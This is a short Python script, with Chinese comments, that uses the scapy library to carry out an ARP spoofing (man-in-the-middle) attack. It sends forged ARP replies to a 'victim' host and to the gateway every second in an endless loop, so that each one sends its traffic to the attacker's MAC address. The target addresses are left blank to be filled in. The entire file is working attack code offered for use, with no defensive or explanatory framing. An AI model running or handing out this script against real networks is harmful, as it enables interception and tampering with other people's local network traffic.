# -*- encoding: UTF-8 -*-
import time
from scapy.all import *

def main():
    gatewayIP = ''      #网关
    victimIP = ''       #受害者ip
    victimMAC = ''      #受害者MAC地址
    hackMAC = ''        #攻击者MAC地址
    gatewayMAC = ''     #网关MAC地址

    packet1 = Ether(src=hackMAC,dst=victimMAC)/ARP(hwsrc=hackMAC,hwdst=victimMAC,psrc=gatewayIP,pdst=victimIP,op=2)
    packet2 = Ether(src=hackMAC,dst=gatewayMAC)/ARP(hwsrc=hackMAC,hwdst=gatewayMAC,psrc=victimIP,pdst=gatewayIP,op=2)
    while 1:
        sendp(packet1,iface="eth0",verbose=False)
        sendp(packet2,iface="eth0",verbose=False)
        time.sleep(1)
        print(packet1.show())
        print(packet2.show())

    pass

if __name__ == '__main__':
    main()